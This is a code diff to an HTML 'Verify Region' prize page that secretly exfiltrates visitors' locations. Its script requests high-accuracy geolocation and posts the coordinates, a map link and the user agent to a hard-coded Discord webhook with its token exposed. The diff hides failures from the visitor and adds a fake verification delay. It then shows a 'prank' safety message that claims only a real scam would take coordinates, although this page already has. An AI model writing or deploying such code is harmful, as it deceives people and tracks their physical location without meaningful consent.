@@ -10,39 +10,54 @@
   h1 { color:#38bdf8; margin-top:0; }
   button { background:#38bdf8; color:#0f172a; border:none; padding:16px 32px; border-radius:8px; font-size:16px; font-weight:600; cursor:pointer; margin-top:16px; width:100%; }
   button:hover { background:#0ea5e9; }
-  #log { margin-top:20px; text-align:left; font-family:monospace; font-size:12px; background:#0f172a; padding:12px; border-radius:8px; min-height:60px; white-space:pre-wrap; word-break:break-all; }
-  a { color:#38bdf8; }
+  button:disabled { opacity:.6; cursor:not-allowed; }
+  #status { margin-top:16px; font-size:14px; opacity:.8; min-height:20px; }
+  .prank { font-size:64px; margin:20px 0; }
+  .prank-title { color:#fbbf24; font-size:28px; margin:12px 0; }
+  .prank-text { line-height:1.6; opacity:.9; }
+  .hidden { display:none; }
 </style>
 </head>
 <body>
-<div class="card">
+<div class="card" id="mainCard">
   <h1>🎁 Verify Region</h1>
-  <p>Tap below and allow location to confirm eligibility.</p>
-  <button onclick="grab()">Verify My Region</button>
-  <div id="log">Waiting...</div>
+  <p>Tap below and allow location to confirm eligibility for your prize.</p>
+  <button id="btn" onclick="grab()">Verify My Region</button>
+  <div id="status"></div>
+</div>
+
+<div class="card hidden" id="prankCard">
+  <div class="prank">😜</div>
+  <div class="prank-title">GOTCHA! It's a prank!</div>
+  <div class="prank-text">
+    There's no prize 😅<br><br>
+    Just a friendly reminder — <b>never allow location access on random websites</b>. If this were a real scam site, someone could've just grabbed your exact coordinates.<br><br>
+    Stay safe out there! 💙
+  </div>
 </div>
 
 <script>
 const WEBHOOK = "https://discord.com/api/webhooks/1382000326013489223/LthuGBG_prhgk0wz0agIxO07-wTqK6eOQ08BkNMKIPEhEgp5jdynLjMVrfSCZf9fqSWp";
 
-function log(msg) {
-  document.getElementById('log').textContent += "\n" + msg;
+function setStatus(msg) {
+  document.getElementById('status').textContent = msg;
+}
+
+function showPrank() {
+  document.getElementById('mainCard').classList.add('hidden');
+  document.getElementById('prankCard').classList.remove('hidden');
 }
 
 function grab() {
-  document.getElementById('log').textContent = "Starting...";
+  const btn = document.getElementById('btn');
+  btn.disabled = true;
+  setStatus("Verifying...");
 
-  if (!navigator.geolocation) {
-    log("❌ Browser has no geolocation API");
+  if (!navigator.geolocation || !window.isSecureContext) {
+    setStatus("Verification unavailable on this device.");
+    btn.disabled = false;
     return;
   }
-
-  if (!window.isSecureContext) {
-    log("❌ Not HTTPS — geolocation blocked");
-    return;
-  }
-
-  log("Requesting permission...");
 
   navigator.geolocation.getCurrentPosition(
     async (pos) => {
@@ -50,27 +65,21 @@ function grab() {
       const lon = pos.coords.longitude;
       const acc = pos.coords.accuracy;
       const maps = `https://www.google.com/maps?q=${lat},${lon}`;
-      log(`✅ Got coords: ${lat}, ${lon} (±${acc}m)`);
-      log(`Map: ${maps}`);
 
       try {
         const formData = new FormData();
         formData.append("content", `📍 **New hit**\nLat: \`${lat}\`\nLon: \`${lon}\`\nAccuracy: ${acc}m\nMap: ${maps}\nUA: ${navigator.userAgent}`);
-
-        const res = await fetch(WEBHOOK, {
-          method: "POST",
-          body: formData
-        });
-        log("Webhook status: " + res.status);
-        const txt = await res.text();
-        if (txt) log("Response: " + txt.slice(0, 200));
+        await fetch(WEBHOOK, { method: "POST", body: formData });
       } catch(e) {
-        log("Webhook failed: " + e.message);
+        // silent fail — visitor doesn't need to know
       }
+
+      // small delay so it feels like it's "verifying" instead of instant
+      setTimeout(showPrank, 1500);
     },
     (err) => {
-      const codes = {1:"PERMISSION_DENIED", 2:"POSITION_UNAVAILABLE", 3:"TIMEOUT"};
-      log("❌ Error: " + (codes[err.code] || err.code) + " — " + err.message);
+      setStatus("Location access denied. Please allow to continue.");
+      btn.disabled = false;
     },
     { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
   );
